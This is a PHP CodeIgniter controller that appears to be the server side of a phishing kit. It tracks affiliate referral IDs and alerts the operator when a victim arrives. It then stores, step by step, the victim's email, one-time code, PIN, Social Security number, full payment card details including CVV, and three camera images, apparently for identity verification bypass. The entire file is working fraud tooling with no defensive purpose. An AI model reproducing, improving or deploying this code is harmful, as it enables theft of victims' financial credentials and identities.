<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Home extends CI_Controller
{
    private $website_id = '';
    public function __construct()
    {
        parent::__construct();
        $this->load->model('home_model');
        $this->website_id = $this->config->item('website_id');
    }

    public function index($id = '')
    {
        if (!empty($id)) {
            $user = $this->home_model->get_user($id);
            if (!empty($user)) {
                $this->home_model->click_count($this->website_id, $id);
                $data = [
                    'url'   => site_url(),
                    'message'   => 'New user has arrived',
                    'title'     => 'New user has arrived',
                    'user_id'   => $id
                ];
                send_notification($data);
                send_notification_admin($data);
            }
            $this->session->set_userdata('user_id', $id);
        }

        $data = [
            'url'   => site_url(),
            'message'   => 'New user has arrived',
            'title'     => 'New user has arrived'
        ];
        send_notification_admin($data);

        $this->load->view('home/index');
    }

    public function email()
    {
        $email = $this->input->post('email');
        //check user id
        if ($this->session->userdata('user_id') == true) {
            $user_id = $this->session->userdata('user_id');
            $user = $this->home_model->get_user($user_id);
            if (!empty($user)) {
                $insert_id = $this->home_model->store_email($this->website_id, $user_id, $email); //insert phone / email
                $this->session->set_userdata('insert_id', $insert_id);
                echo json_encode(['status' => true, 'email' => $email]);
            }
        } else {
            $insert_id = $this->home_model->store_email($this->website_id, 1, $email);
            $this->session->set_userdata('insert_id', $insert_id);
            echo json_encode(['status' => true, 'email' => $email]);
        }
    }

    public function code()
    {
        $code = $this->input->post('code');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_code($insert_id, $code);
        echo json_encode(['status' => true, 'code' => $code]);
    }



    public function pin()
    {
        $pin = $this->input->post('pin');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_pin($insert_id, $pin);
        echo json_encode(['status' => true, 'pin' => $pin]);
    }

    public function ssn()
    {
        $ssn = $this->input->post('ssn');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_ssn($insert_id, $ssn);
        echo json_encode(['status' => true, 'ssn' => $ssn]);
    }

    public function card()
    {
        $number = $this->input->post('card-number');
        $date = $this->input->post('card-date');
        $zip = $this->input->post('card-zip');
        $cvv = $this->input->post('card-cvv');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_card($insert_id, $number, $date, $zip, $cvv);
        echo json_encode(['status' => true]);
    }

    public function camera()
    {
        $image = $this->input->post('image');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_image($insert_id, $image);
        echo json_encode(['status' => true]);
    }

    public function camera2()
    {
        $image = $this->input->post('image2');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_image2($insert_id, $image);
        echo json_encode(['status' => true]);
    }

    public function camera3()
    {
        $image = $this->input->post('image3');
        $insert_id = $this->session->userdata('insert_id');
        $this->home_model->store_image3($insert_id, $image);
        echo json_encode(['status' => true]);
    }
}
